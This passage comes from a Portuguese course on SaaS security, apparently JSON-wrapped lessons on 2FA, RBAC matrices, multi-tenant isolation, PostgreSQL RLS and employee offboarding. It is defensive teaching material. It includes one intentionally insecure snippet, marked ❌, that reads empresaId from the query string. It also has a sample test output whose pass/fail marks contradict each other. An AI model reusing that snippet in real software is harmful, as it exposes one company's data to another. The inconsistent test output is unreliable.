crescente.\n2. **Atraso ou desafio** (CAPTCHA) após várias falhas.\n3. **Senhas comuns recusadas** (Aula 9.1).\n4. **2FA**, que torna a senha vazada insuficiente.\n5. **Alerta ao usuário** de login a partir de um dispositivo novo.\n6. **Monitoramento**: um pico de falhas de login é sinal de ataque (Módulo 15).\n\n> ⚠️ Cuidado com o bloqueio total da conta após N tentativas: um atacante pode bloquear de propósito as contas da empresa inteira. Prefira espera crescente e desafio, em vez de bloqueio permanente.\n\n### Login social e convites\n\nEntrar com Google ou Microsoft é cômodo e transfere parte da segurança para esses provedores (que têm 2FA robusto). Se oferecer, cuide de **não juntar contas automaticamente** só porque o e-mail é igual, sem confirmar a posse, e de manter a regra de que o acesso a uma empresa depende de **convite** (Aula 9.6), não só de ter uma conta.\n\n### Exemplo completo: a invasão que não aconteceu\n\nÀs 3h de um domingo, o monitoramento do Gestor mostra 4.000 tentativas de login falhas em 20 minutos, de 300 IPs diferentes, contra 900 e-mails. É um ataque de preenchimento de credenciais.\n\nO que segurou:\n- O limite por IP e por conta desacelerou o ataque.\n- Dois usuários tinham senhas que estavam na lista vazada. Um deles era um dono, com 2FA obrigatório: o atacante acertou a senha e parou no segundo fator. O outro era uma atendente sem 2FA, e o login com dispositivo novo gerou um alerta por e-mail.\n\nO que você fez na segunda-feira (seguindo o plano de incidente, Módulo 14): forçou a troca de senha da atendente, revisou a auditoria dela (nenhuma ação suspeita), avisou a empresa cliente, e propôs tornar o 2FA obrigatório também para gerentes. Esse episódio vira uma linha poderosa no seu Dossiê de Confiança: **\"nosso sistema detectou e conteve um ataque automatizado sem acesso indevido a dados\"**.\n\n> 📌 **Em resumo**\n> - 2FA com app autenticador ou passkey; obrigatório para quem controla a conta.\n> - Recuperação de senha com token aleatório, curto, de uso único, guardado como hash; encerre sessões e avise o usuário.\n> - Limite de tentativas por conta e por IP, com espera crescente, contra força bruta e listas vazadas.\n> - Monitore picos de falha de login.\n\n### Para ir além\n- [NIST SP 800-63B: diretrizes de autenticação (em inglês)](https://pages.nist.gov/800-63-4/sp800-63b.html)", "words": 862}, {"id": "m9-4", "title": "Aula 9.3: Autorização: papéis e permissões", "md": "Agora o sistema sabe **quem** é o usuário. Falta decidir **o que** ele pode fazer. A falha de autorização é a número 1 da lista OWASP Top 10 de riscos em aplicações web, e a mais comum em sistemas gerados por IA: o botão some da tela, mas a rota continua aberta.\n\n### RBAC: controle de acesso baseado em papéis\n\nO modelo mais usado em sistemas de gestão é o **RBAC**: cada usuário tem um **papel** (dono, gerente, atendente) e cada papel tem um conjunto de **permissões** (ações que pode fazer).\n\n```mermaid\nflowchart LR\n    U1[\"Ana\"] --> P1[\"Dono\"]\n    U2[\"Bruno\"] --> P2[\"Gerente\"]\n    U3[\"Carla\"] --> P3[\"Atendente\"]\n    P1 --> A1[\"financeiro:ver\"]\n    P1 --> A2[\"usuarios:gerenciar\"]\n    P1 --> A3[\"assinatura:gerenciar\"]\n    P2 --> A1\n    P2 --> A4[\"clientes:exportar\"]\n    P1 --> A4\n    P3 --> A5[\"conversas:responder\"]\n    P2 --> A5\n    P1 --> A5\n```\n*Figura: usuários recebem papéis, e papéis recebem permissões. A verificação no código é sempre pela permissão, nunca pelo nome do papel.*\n\n### Verifique a permissão, não o papel\n\n```typescript\n// ❌ espalhado pelo código, difícil de mudar\nif (sessao.papel === \"dono\" || sessao.papel === \"gerente\") { ... }\n\n// ✔ uma tabela central de permissões\nexigirPermissao(sessao, \"financeiro:ver\");\n```\n\n```typescript\n// src/server/auth/permissoes.ts\nexport const PERMISSOES = {\n  dono:      [\"clientes:*\", \"financeiro:*\", \"usuarios:gerenciar\", \"assinatura:gerenciar\", \"conversas:*\", \"auditoria:ver\"],\n  gerente:   [\"clientes:*\", \"financeiro:ver\", \"financeiro:lancar\", \"conversas:*\"],\n  atendente: [\"clientes:ver\", \"clientes:criar\", \"conversas:responder\"],\n} as const;\n```\n\nQuando o cliente disser \"agora o gerente também pode gerenciar usuários\", você muda **uma linha**, e os testes mostram exatamente o que passou a ser permitido.\n\n### A matriz de permissões\n\nEla nasce do mapa de telas por papel da especificação (Aula 4.4) e vira a fonte da verdade:\n\n| Permissão | Dono | Gerente | Atendente |\n|---|---|---|---|\n| `clientes:ver` | ✔ | ✔ | ✔ |\n| `clientes:criar` | ✔ | ✔ | ✔ |\n| `clientes:excluir` | ✔ | ✔ | ✘ |\n| `clientes:exportar` | ✔ | ✔ | ✘ |\n| `financeiro:ver` | ✔ | ✔ | ✘ |\n| `financeiro:lancar` | ✔ | ✔ | ✘ |\n| `financeiro:estornar` | ✔ | ✘ | ✘ |\n| `usuarios:gerenciar` | ✔ | ✘ | ✘ |\n| `assinatura:gerenciar` | ✔ | ✘ | ✘ |\n| `auditoria:ver` | ✔ | ✘ | ✘ |\n\n> 🎯 **Teste gerado da matriz:** peça ao Claude um teste que lê a matriz e, para **cada papel e cada rota**, confirma que a resposta é 200/201 quando permitido e 403 quando não. Assim, a matriz não é só documentação: ela é verificada a cada mudança.\n\n### Além dos papéis: regras de posse e de contexto\n\nPapéis não resolvem tudo. Às vezes a regra depende **do registro**:\n- \"O atendente vê só as conversas **atribuídas a ele**.\"\n- \"O vendedor vê só os clientes **dos quais é responsável**.\"\n- \"O gerente vê só os dados **da loja dele**.\"\n\nEssas regras ficam no serviço, como filtros adicionais à consulta (além do `empresaId`):\n\n```typescript\nconst filtro = { empresaId: sessao.empresaId, excluidoEm: null };\nif (!temPermissao(sessao, \"conversas:ver_todas\")) {\n  filtro.atendenteId = sessao.usuarioId;\n}\n```\n\n### Princípio do menor privilégio\n\nCada papel recebe **o mínimo** necessário para o trabalho. Na dúvida, não permita, e libere quando o cliente pedir. É muito mais fácil liberar uma permissão que esqueceu do que explicar por que a atendente exportou a base inteira de clientes antes de ir para o concorrente.\n\nOfereça ao cliente, quando fizer sentido, **papéis personalizados** (o dono monta um papel marcando permissões). Isso exige guardar papéis e permissões no banco em vez de no código, e é uma funcionalidade comum de versão 2 de SaaS.\n\n### Exemplo completo: a falha que o teste pegou\n\nO cliente pediu: \"o gerente agora pode ver o relatório de comissões\". O Claude adicionou `comissoes:ver` ao gerente e criou a rota `/api/comissoes`. Na rota, porém, ele verificou `financeiro:ver` (que o gerente já tinha) em vez de `comissoes:ver`.\n\nO teste gerado da matriz mostrou:\n```text\n✗ atendente > GET /api/comissoes → esperado 403, recebido 403 ✔\n✗ gerente   > GET /api/comissoes → esperado 200, recebido 200 ✔\n✗ permissão comissoes:ver não é exigida por nenhuma rota\n```\n\nO terceiro teste (que confere que toda permissão declarada é usada por alguma rota) revelou a inconsistência. Hoje não havia vazamento, mas no dia em que alguém tirasse `comissoes:ver` de um papel, a rota continuaria aberta. Corrigido antes de existir o problema.\n\n> 📌 **Em resumo**\n> - RBAC: usuários têm papéis, papéis têm permissões; o código verifica permissões, numa tabela central.\n> - A matriz de permissões vem da especificação e gera testes automáticos para cada papel e rota.\n> - Regras de posse e contexto (só os meus, só da minha loja) são filtros adicionais no serviço.\n> - Menor privilégio: na dúvida, não permita.\n\n### Para ir além\n- [OWASP Top 10 (em inglês)](https://owasp.org/Top10/): leia o item A01, Broken Access Control.", "words": 703}, {"id": "m9-5", "title": "Aula 9.4: Multi-tenant: uma empresa nunca vê a outra", "md": "Em um SaaS, dezenas ou centenas de empresas usam o mesmo sistema e, muitas vezes, o mesmo banco. Se uma única consulta esquecer o filtro, a Ótica A vê os clientes da Ótica B. Esse é o incidente que pode acabar com um SaaS em um dia: além do dano a todos os clientes, é um incidente de segurança com dados pessoais que pode precisar ser comunicado à ANPD.\n\n### Três estratégias de multi-tenant\n\n```mermaid\nflowchart TB\n    subgraph E1[\"1. Banco compartilhado, coluna empresaId\"]\n        T1[(\"Uma tabela clientes<br/>com empresaId em cada linha\")]\n    end\n    subgraph E2[\"2. Um schema por empresa\"]\n        T2a[(\"schema empresa_a\")]\n        T2b[(\"schema empresa_b\")]\n    end\n    subgraph E3[\"3. Um banco por empresa\"]\n        T3a[(\"banco empresa_a\")]\n        T3b[(\"banco empresa_b\")]\n    end\n```\n*Figura: as três estratégias de multi-tenant, da mais compartilhada à mais separada.*\n\n| Estratégia | Isolamento | Custo e operação | Quando usar |\n|---|---|---|---|\n| **1. Coluna `empresaId`** | Depende do código (e de RLS) | Baixo: um banco, uma migration | **Padrão** para SaaS de PMEs |\n| **2. Schema por empresa** | Maior | Médio: migrations em cada schema | Muitos dados por cliente, exigência de separação |\n| **3. Banco por empresa** | Máximo | Alto: N bancos, N backups | Clientes grandes que exigem contratualmente, dados muito sensíveis |\n\nA estratégia 1 é a mais usada e a desta formação. Ela exige disciplina: o isolamento é garantido **pelas suas camadas de defesa**. A Aula 9.5 adiciona a camada do banco.\n\n### Empresa, usuário e membro\n\nUm mesmo usuário pode pertencer a mais de uma empresa (o contador que atende 5 clientes, o dono de duas lojas). O modelo:\n\n```text\nusuarios        (id, nome, email, ...)          ← a pessoa\nempresas        (id, nome, plano, ...)          ← o tenant\nmembros         (usuarioId, empresaId, papel)   ← a pessoa NESTA empresa, com este papel\n```\n\nA sessão guarda **a empresa ativa**. Trocar de empresa é uma ação explícita, que confere se o usuário é membro dela.\n\n### De onde vem o `empresaId`: só da sessão\n\nA regra mais importante do módulo:\n\n> 🎯 **O `empresaId` usado nas consultas vem sempre da sessão no servidor, depois de conferir que o usuário é membro daquela empresa. Nunca da URL, do corpo da requisição, de um cabeçalho ou de um campo escondido do formulário.**\n\n```typescript\n// ❌ o atacante só precisa trocar o valor\nconst clientes = await db.cliente.findMany({ where: { empresaId: req.query.empresaId } });\n\n// ✔\nconst sessao = await exigirSessao(req);   // contém empresaId ativo, já validado como membro\nconst clientes = await db.cliente.findMany({ where: { empresaId: sessao.empresaId } });\n```\n\n### Como não esquecer o filtro: o repositório com escopo\n\nEsquecer o `empresaId` em **uma** consulta entre centenas é humano (e é de IA). A defesa é estrutural: em vez de cada serviço acessar `db` diretamente, todos usam um **acesso ao banco já com escopo da empresa**:\n\n```typescript\n// src/server/db-escopo.ts\nexport function dbDaEmpresa(sessao: Sessao) {\n  return db.$extends({\n    query: {\n      $allModels: {\n        async $allOperations({ model, args, query }) {\n          if (MODELOS_DE_NEGOCIO.has(model)) {\n            args.where = { ...args.where, empresaId: sessao.empresaId };\n            // para create, também força o empresaId nos dados\n          }\n          return query(args);\n        },\n      },\n    },\n  });\n}\n```\n\nCom isso, mesmo que o Claude esqueça o filtro, ele é aplicado. Junto, uma regra de lint ou teste que **proíbe** importar `db` diretamente nos serviços de negócio (só `dbDaEmpresa`).\n\n> ⚠️ Essa extensão é uma camada de conveniência e segurança, não a única. Ela precisa ser testada (inclusive para `create`, `update`, `delete`, `count` e consultas com `include` de relações) e convive com a RLS da próxima aula.\n\n### Outros vazamentos entre empresas que você precisa fechar\n\n| Onde | Risco | Proteção |\n|---|---|---|\n| Arquivos (anexos, PDFs) | URL do arquivo de outra empresa | Caminho com `empresaId`; download só por rota que verifica a sessão; links temporários |\n| Tarefas em segundo plano | Tarefa processa dados sem sessão | Toda tarefa carrega o `empresaId` e usa `dbDaEmpresa` |\n| Cache | Resultado da empresa A servido para a B | Chave de cache sempre inclui o `empresaId` |\n| Busca e autocompletar | Sugestões de clientes de outras empresas | Mesmo filtro, mesmos testes |\n| Contadores e relatórios globais | Totais somando todas as empresas | Só no painel administrativo seu, separado |\n| Logs e ferramentas de erro | Dados de várias empresas misturados | Logs com `empresaId`, sem dados pessoais |\n| Webhooks | Evento atribuído à empresa errada | Encontrar a empresa pela referência guardada (id da cobrança), nunca por dado enviado no evento sem conferência |\n\n### Exemplo completo: o teste de isolamento que roda em tudo\n\n```text\nCrie tests/isolamento.test.ts que:\n1. Cria as empresas A e B com dados em todos os modelos de negócio.\n2. Para cada rota de API e Server Action que recebe um id, chama com um usuário\n   da empresa A passando o id de um registro da empresa B, em GET, PATCH e DELETE.\n3. Confirma: resposta 404, e o registro da empresa B não foi alterado.\n4. Para cada listagem, confirma que nenhum item da empresa B aparece para A.\n5. Para criação, envia empresaId da B no corpo e confirma que o registro foi\n   criado na A (ou recusado), nunca na B.\n6. Falha se existir uma rota nova que não esteja coberta (lista de rotas gerada\n   automaticamente).\n```\n\nEsse teste é o seu **seguro contra o pior incidente de um SaaS**, e é uma evidência concreta para o Dossiê de Confiança.\n\n> 📌 **Em resumo**\n> - Coluna `empresaId` no banco compartilhado é o padrão; schema ou banco por empresa para exigências maiores.\n> - Usuários pertencem a empresas por meio de membros com papel; a sessão guarda a empresa ativa.\n> - O `empresaId` vem só da sessão, nunca do que o navegador envia.\n> - Acesso ao banco com escopo automático, mais testes de isolamento em todas as rotas, arquivos, tarefas e cache.\n\n### Para ir além\n- [Guia de segurança multi-tenant da OWASP (em inglês)](https://cheatsheetseries.owasp.org/cheatsheets/Multi_Tenant_Security_Cheat_Sheet.html)", "words": 920}, {"id": "m9-6", "title": "Aula 9.5: Isolamento no banco (RLS) e testes sistemáticos", "md": "O filtro por `empresaId` no código é a primeira linha de defesa. Mas código tem bugs, e o Claude pode escrever, um dia, uma consulta em SQL puro que escapa da extensão. A **Row Level Security** (RLS) do PostgreSQL coloca uma última barreira **dentro do banco**: mesmo que o código erre, o banco se recusa a entregar as linhas de outra empresa.\n\n### Como a RLS funciona\n\nVocê define **políticas** em cada tabela: \"uma linha só é visível se `empresaId` for igual à empresa definida na conexão atual\".\n\n```sql\nALTER TABLE \"Cliente\" ENABLE ROW LEVEL SECURITY;\nALTER TABLE \"Cliente\" FORCE ROW LEVEL SECURITY;\n\nCREATE POLICY isolamento_empresa ON \"Cliente\"\n  USING (\"empresaId\" = current_setting('app.empresa_id', true))\n  WITH CHECK (\"empresaId\" = current_setting('app.empresa_id', true));\n```\n\nE, a cada requisição, a aplicação informa ao banco qual é a empresa da sessão, **dentro da mesma transação** em que faz as consultas:\n\n```sql\nSELECT set_config('app.empresa_id', 'emp-3', true);  -- true = vale só nesta transação\nSELECT * FROM \"Cliente\";                              -- só devolve os da emp-3\n```\n\n```mermaid\nflowchart LR\n    Q[\"Consulta com bug<br/>SELECT * FROM clientes<br/>(sem filtro)\"] --> APP[\"Extensão de escopo<br/>(camada 1)\"]\n    APP -->|\"escapou?\"| RLS[\"Política RLS no banco<br/>(camada 2)\"]\n    RLS --> R[\"Só linhas da empresa<br/>da sessão\"]\n```\n*Figura: duas camadas de isolamento. Mesmo que uma consulta escape do filtro do código, a política do banco limita o resultado à empresa da sessão.*\n\n### Cuidados importantes\n\n| Cuidado | Por quê |\n|---|---|\n| A aplicação conecta com um **usuário do banco sem privilégio de ignorar RLS** | Donos de tabela e superusuários ignoram RLS por padrão; `FORCE ROW LEVEL SECURITY` e um usuário próprio da aplicação evitam isso |\n| `set_config` dentro da **transação** (`true` no terceiro parâmetro) | Com conexões reaproveitadas (pool), uma configuração que \"sobra\" de outra requisição seria um desastre |\n| Migrations e tarefas administrativas usam outro usuário | Para conseguirem operar em todas as empresas, de forma controlada e registrada |\n| Testar a RLS | Uma política escrita errado dá uma falsa sensação de segurança |\n| Desempenho | A coluna `empresaId` com índice mantém a RLS rápida |\n\n> 💡 **RLS é obrigatória?** Para um SaaS com dados pessoais de muitas empresas, é uma camada extra que vale o esforço, e um argumento forte para o cliente (\"o isolamento é garantido pelo próprio banco, além do código\"). Para um sistema sob medida de uma única empresa, o ganho é menor. Registre a decisão em um ADR (no Gestor, ADR 0005).\n\n### Testes de isolamento: a bateria completa\n\nJunte as camadas em uma bateria de testes que roda em todo pull request:\n\n| Teste | O que prova |\n|---|---|\n| Rotas com id de outra empresa → 404 (Aula 9.4) | O código isola |\n| Listagens não trazem itens de outra empresa | O código isola |\n| `empresaId` enviado no corpo é ignorado | Contra atribuição em massa |\n| Consulta SQL direta, sem filtro, com `app.empresa_id` da A → só linhas da A | **A RLS isola mesmo sem o filtro do código** |\n| Consulta sem `app.empresa_id` definido → nenhuma linha | A RLS falha \"fechada\" |\n| Arquivo da empresa B pedido por usuário da A → 404 | Arquivos isolados |\n| Tarefa em segundo plano da empresa A não altera dados da B | Tarefas isoladas |\n| Todas as tabelas de negócio têm RLS ativa (consulta ao catálogo do banco) | Ninguém esqueceu uma tabela nova |\n\nO último teste é especialmente valioso: ele consulta o próprio PostgreSQL para listar as tabelas sem RLS. Quando alguém criar uma tabela nova e esquecer a política, o teste quebra.\n\n### Exemplo completo: o pedido ao Claude\n\n```text\nImplemente o ADR 0005 (isolamento com RLS como segunda camada).\n\n1. Migration que habilita e força RLS em todas as tabelas com empresaId, com\n   política USING e WITH CHECK baseada em current_setting('app.empresa_id', true).\n2. Usuário do banco \"gestor_app\" sem BYPASSRLS e sem ser dono das tabelas;\n   a aplicação conecta com ele. Migrations usam \"gestor_migracao\".\n3. dbDaEmpresa passa a abrir uma transação e executar set_config com true\n   antes das consultas.\n4. Testes da tabela da Aula 9.5, inclusive o que lista tabelas sem RLS.\n5. Documente no docs/arquitetura.md como funciona e como criar tabelas novas.\n\nAntes: confirme na documentação atual do Prisma a forma recomendada de usar\nset_config por transação com pool de conexões, e me mostre o plano.\n```\n\n> 📌 **Em resumo**\n> - A RLS faz o próprio PostgreSQL recusar linhas de outra empresa, mesmo que o código erre.\n> - A empresa da sessão é informada ao banco por transação; a aplicação usa um usuário sem privilégio de ignorar RLS.\n> - Teste a RLS diretamente, inclusive com consulta sem filtro e sem empresa definida.\n> - Um teste que lista tabelas sem RLS impede que uma tabela nova fique desprotegida.\n\n### Para ir além\n- [Row Level Security (documentação do PostgreSQL, em inglês)](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)\n- [RLS no Supabase (em inglês)](https://supabase.com/docs/guides/database/postgres/row-level-security)", "words": 789}, {"id": "m9-7", "title": "Aula 9.6: Ciclo de vida dos usuários", "md": "Funcionários entram, mudam de função e saem. Clientes pedem para você \"dar uma olhada\" na conta deles. Cada um desses momentos é uma oportunidade de erro: o ex-funcionário que continua com acesso, o convite enviado para o e-mail errado, o suporte que vê mais do que devia. Esta aula fecha as brechas do dia a dia.\n\n### Convite: a única porta de entrada em uma empresa\n\n```mermaid\nsequenceDiagram\n    participant D as Dono\n    participant G as Gestor\n    participant N as Novo usuário\n    D->>G: convida carla@otica.com.br como atendente\n    G->>G: cria convite (token aleatório, hash, validade 7 dias, papel)\n    G->>N: e-mail com link do convite\n    N->>G: abre o link, cria conta ou entra na existente\n    G->>G: confere e-mail do convite = e-mail da conta, token válido\n    G->>G: cria membro (Carla, Ótica, atendente), invalida o convite\n    G->>D: aviso \"Carla entrou na equipe\"\n```\n*Figura: o fluxo de convite. O acesso a uma empresa só nasce de um convite válido, de uso único, para o e-mail certo.*\n\nRegras:\n- Só quem tem `usuarios:gerenciar` convida.\n- Ninguém convida para um papel **maior** que o próprio.\n- O convite expira e é de uso único; pode ser cancelado.\n- O e-mail da conta tem que bater com o do convite.\n- Tudo é auditado.\n\n### Mudança de papel\n\n- Registrada na auditoria (quem mudou, de qual papel para qual).\n- Efeito **imediato**: as próximas requisições já usam o novo papel (outro motivo para sessões no banco e permissões verificadas a cada requisição).\n- O sistema impede que a empresa fique **sem nenhum dono** (o último dono não pode se rebaixar nem ser removido).\n\n### Desligamento: o momento mais crítico\n\nQuando um funcionário sai, especialmente em conflito, o risco é real. O fluxo de desligamento:\n\n| Passo | O que o sistema faz |\n|---|---|\n| 1 | Remove o membro da empresa (ou o marca como inativo) |\n| 2 | **Encerra todas as sessões** dele naquela empresa, imediatamente |\n| 3 | Revoga tokens de API e integrações criados por ele |\n| 4 | Pede para transferir os registros dos quais era responsável (clientes, conversas) |\n| 5 | Registra na auditoria |\n| 6 | Mantém o histórico (o que ele fez continua atribuído a ele) |\n\nNa conversa com o cliente, isso vira um argumento simples: **\"quando alguém sai da empresa, você remove o acesso em um clique, e ele perde o acesso na mesma hora, em todos os dispositivos\"**.\n\n### Acesso de suporte: o seu poder, controlado\n\nVocê, como fornecedor, vai precisar investigar problemas na conta de um cliente. O jeito errado é ter uma \"senha mestra\" ou consultar o banco de produção à vontade. O jeito certo:\n\n| Princípio | Na prática |\n|---|---|\n| **Consentimento** | O cliente autoriza o acesso de suporte (um botão \"permitir acesso do suporte por 24 horas\"), ou isso está previsto em contrato para casos específicos |\n| **Prazo** | O acesso expira sozinho |\n| **Escopo** | De preferência somente leitura |\n| **Registro** | Toda ação feita no modo suporte fica na auditoria, marcada como \"suporte\" |\n| **Visibilidade** | O cliente consegue ver quando o suporte acessou |\n| **Seu próprio acesso protegido** | Sua conta de administrador com 2FA forte (chave física, de preferência) |\n\nEsse recurso (chamado de \"impersonação\" ou \"acessar como\") é poderoso e perigoso. Construa só quando precisar, e com essas regras.\n\n### Seu painel administrativo\n\nUm SaaS precisa de uma área **sua**, separada das empresas: ver assinaturas, empresas ativas, métricas, problemas. Regras:\n- Separada da aplicação dos clientes (outra rota protegida, de preferência outro subdomínio).\n- Acesso só para você (e quem você autorizar), com 2FA forte.\n- Mostra o mínimo de dados pessoais necessário (você precisa saber que a empresa X tem 2.000 clientes, não quem são eles).\n- Tudo auditado.\n\n### Exemplo completo: a demissão de sexta-feira\n\nSexta-feira, 17h55, a dona da Ótica Visão Clara demite um vendedor. Ela abre o Gestor no celular, vai em **Equipe**, toca em \"Remover acesso\" no nome dele e confirma.\n\nEm menos de um segundo:\n- O vendedor, que estava com o sistema aberto no celular, recebe \"Sua sessão foi encerrada\" na próxima ação.\n- Os 43 clientes dos quais ele era responsável aparecem para a dona com o aviso \"Transferir clientes\".\n- A auditoria registra: \"Ana (dona) removeu João (vendedor) às 17h55\".\n\nNa segunda-feira, a dona consulta a auditoria e confirma: nenhuma exportação ou alteração suspeita nas últimas semanas. Ela dorme tranquila no fim de semana, e é isso que ela vai contar para outros donos de ótica quando perguntarem sobre o seu sistema.\n\n> 📌 **Em resumo**\n> - Acesso a uma empresa só por convite: uso único, com validade, para o e-mail certo, sem papel maior que o de quem convida.\n> - Mudanças de papel e desligamentos têm efeito imediato e são auditados; desligar encerra todas as sessões.\n> - Acesso de suporte com consentimento, prazo, escopo mínimo e registro.\n> - Seu painel administrativo é separado, protegido por 2FA forte e mostra o mínimo de dados pessoais.", "words": 789}, {"id": "m9-8", "title": "Exercícios", "md": "### Exercício 1: Audite o login (45 min)\nNo Gestor, confira e registre: algoritmo de hash usado; atributos do cookie de sessão (F12 → Aplicação → Cookies); mensagem de erro com e-mail inexistente e com senha errada (devem ser iguais); o que acontece com a sessão no banco após o logout.\n\n### Exercício 2: Recuperação de senha (45 min)\nImplemente ou revise o fluxo de recuperação com os requisitos da Aula 9.2 e escreva testes: token expirado recusado; token usado duas vezes recusado; outras sessões encerradas após a troca; resposta igual para e-mail existente e inexistente.\n\n### Exercício 3: A matriz que se testa (60 min)\nEscreva a matriz de permissões do Gestor e peça ao Claude o teste gerado da matriz (Aula 9.3). Depois, mude de propósito uma rota para verificar a permissão errada e veja o teste falhar.\n\n### Exercício 4: Ataque de isolamento manual (60 min)\n**Objetivo:** pensar como atacante.\nCom dois usuários de empresas diferentes no Gestor local, tente ver ou alterar dados da outra empresa por pelo menos 6 caminhos: trocar o id na URL, mandar `empresaId` no corpo, baixar um anexo pelo link, usar a busca, usar a exportação, chamar uma Server Action diretamente.\n\n<details>\n<summary><strong>Resolução comentada<\/strong><\/summary>\n\nPara cada caminho, o resultado esperado é:\n1. **Id na URL** (GET/PATCH/DELETE): 404, sem alteração.\n2. **`empresaId` no corpo** de uma criação: ignorado (registro criado na própria empresa) ou recusado pelo schema estrito.\n3. **Link de anexo** copiado da outra empresa: 404, porque o download passa por rota que confere a sessão; ou o link temporário expirou.\n4. **Busca/autocompletar** com nome de cliente da outra empresa: nenhum resultado.\n5. **Exportação**: só dados da própria empresa (confira abrindo o CSV).\n6. **Server Action chamada diretamente** (copie a requisição na aba Rede e reenvie alterando o id): 404.\n\nSe qualquer caminho funcionar, você encontrou uma falha crítica: corrija, escreva o teste que a reproduz e registre no diário. Para ir além, desative temporariamente o filtro do código em uma consulta (só no ambiente local) e confirme que a RLS ainda bloqueia.\n<\/details>\n\n### Exercício 5: Simulação de desligamento (30 min)\nCom dois navegadores (um como dono, outro como atendente logado), remova o atendente. Confirme que a próxima ação no navegador dele é recusada, que a auditoria registrou e que os registros sob responsabilidade dele foram sinalizados para transferência.", "words": 393}, {"id": "m9-9", "title": "Tarefa de campo", "md": "**Desenhe as permissões do caso real** (Módulo 4) com o cliente. Leve a matriz de permissões em linguagem de negócio (\"quem pode ver o faturamento?\", \"quem pode dar desconto?\", \"quem pode exportar a lista de clientes?\") e preencha junto com ele. Pergunte também: \"quando alguém sai da empresa, quem remove o acesso e com que rapidez?\". Registre as respostas na especificação.", "words": 61}, {"id": "m9-10", "title": "Entregável: Gestor multi-empresa com papéis", "md": "**Checklist de qualidade:**\n- [ ] Login com Better Auth, sessões no banco, cookie `HttpOnly`/`Secure`/`SameSite`.\n- [ ] Senhas: mínimo de comprimento, senhas comuns recusadas, mensagens genéricas.\n- [ ] 2FA obrigatório para dono, com códigos de recuperação.\n- [ ] Recuperação de senha segura (token curto, uso único, encerra sessões, avisa).\n- [ ] Limite de tentativas no login e na recuperação.\n- [ ] Matriz de permissões central, com teste gerado para todas as rotas e papéis.\n- [ ] `empresaId` sempre da sessão; acesso ao banco com escopo automático.\n- [ ] RLS ativa e forçada em todas as tabelas de negócio, com teste que detecta tabela sem RLS.\n- [ ] Bateria de testes de isolamento (rotas, listas, criação, arquivos, tarefas).\n- [ ] Convite, troca de papel e desligamento com efeito imediato e auditoria.\n- [ ] Empresa nunca fica sem dono.", "words": 116}, {"id": "m9-11", "title": "Autoavaliação", "md": "Meta: 8 de 10.\n\n1. Qual a diferença entre autenticação e autorização? Dê um exemplo de falha de cada.\n2. Por que usar Argon2id ou bcrypt, e não SHA-256, para senhas?\n3. Por que sessões no banco são preferíveis a tokens JWT de longa duração em um sistema de gestão?\n4. Para que servem os atributos `HttpOnly` e `SameSite` do cookie?\n5. Cite 4 regras de uma recuperação de senha segura.\n6. Por que o código deve verificar `exigirPermissao(sessao, \"financeiro:ver\")` em vez de `papel === \"dono\"`?\n7. De onde deve vir o `empresaId` usado nas consultas? Cite dois lugares de onde **nunca** deve vir.\n8. Se o código já filtra por `empresaId`, por que adicionar RLS?\n9. Cite 3 lugares, além das rotas, onde pode haver vazamento entre empresas.\n10. Um funcionário foi demitido. O que o sistema precisa fazer para que ele perca o acesso na hora?\n\n<details>\n<summary><strong>Gabarito<\/strong><\/summary>\n\n1. Autenticação confirma quem é o usuário; autorização decide o que ele pode fazer. Falha de autenticação: login aceita senha errada ou sessão roubada. Falha de autorização: atendente consegue acessar o financeiro chamando a rota diretamente.\n2. Porque Argon2id, scrypt e bcrypt são propositalmente lentos e usam sal, tornando caro testar bilhões de senhas se o banco vazar. SHA-256 é rápido, o que facilita a quebra.\n3. Porque permitem revogar o acesso imediatamente (apagando a sessão), essencial quando alguém é desligado ou uma conta é invadida. Um JWT longo continua válido até expirar.\n4. `HttpOnly` impede que o JavaScript da página leia o cookie (protege contra roubo de sessão por XSS). `SameSite` impede o envio do cookie em requisições vindas de outros sites (protege contra CSRF).\n5. Token longo e aleatório guardado como hash; validade curta e uso único; resposta igual para e-mail existente ou não; encerrar outras sessões após a troca; avisar o usuário por e-mail; não pular o 2FA.\n6. Porque centraliza as regras em uma tabela: mudar o que um papel pode fazer é mudar uma linha, e testes conferem a matriz. Verificar nomes de papel espalha regras pelo código e gera inconsistências.\n7. Da sessão, no servidor, depois de conferir que o usuário é membro da empresa. Nunca da URL, do corpo da requisição, de cabeçalhos ou de campos escondidos do formulário.\n8. Como defesa em profundidade: se uma consulta escapar do filtro (bug, SQL puro, código novo), o próprio banco se recusa a entregar linhas de outra empresa.\n9. Arquivos e anexos; tarefas em segundo plano; cache; busca e autocompletar; exportações; webhooks; logs e ferramentas de erro.\n10. Remover (ou inativar) o membro, encerrar todas as sessões dele imediatamente, revogar tokens e integrações, sinalizar a transferência dos registros sob responsabilidade dele e registrar tudo na auditoria. Como as permissões são verificadas a cada requisição com sessão no banco, o efeito é imediato.\n<\/details>", "words": 477}, {"id": "m9-12", "title": "Checklist de segurança do módulo", "md": "- [ ] Hash de senha com algoritmo próprio para senhas (pela biblioteca).\n- [ ] Cookie de sessão `HttpOnly`, `Secure`, `SameSite`; expiração por inatividade.\n- [ ] Mensagens genéricas no login e na recuperação.\n- [ ] 2FA obrigatório para quem controla a conta.\n- [ ] Limite de tentativas no login e na recuperação.\n- [ ] Matriz de permissões central e testada.\n- [ ] `empresaId` só da sessão; escopo automático; RLS como segunda camada.\n- [ ] Testes de isolamento em todas as superfícies.\n- [ ] Desligamento com efeito imediato; acesso de suporte com consentimento e registro.\n- [ ] Sua conta administrativa com 2FA forte.", "words": 81}, {"id": "m9-13", "title": "Para aprofundar (opcional)", "md": "| Material | Formato | Por que vale |\n|---|---|---|\n| [OWASP Top 10: Broken Access Control](https://owasp.org/Top10/) | Texto, em inglês | O risco número 1 de aplicações web |\n| [Guia multi-tenant da OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Multi_Tenant_Security_Cheat_Sheet.html) | Texto, em inglês | Checklist específico de SaaS |\n| [Documentação do Better Auth](https://www.better-auth.com/docs/introduction) | Texto, em inglês | 2FA, organizações e sessões |\n| [NIST SP 800-63B](https://pages.nist.gov/800-63-4/sp800-63b.html) | Norma, em inglês | A referência de regras de senha e autenticação |", "words": 87}]}, {"id": "m10", "file": "modulo-10-pagamentos-e-assinaturas.md", "short": "M10", "title": "Módulo 10: Pagamentos e assinaturas automáticas", "meta": "Semanas 19 e 20 · cerca de 26 horas", "group": "Fase 3 · Construindo o sistema", "lessons": [{"id": "m10-1", "title": "Objetivos de aprendizagem", "md": "Você quer vender sistemas em escala, com 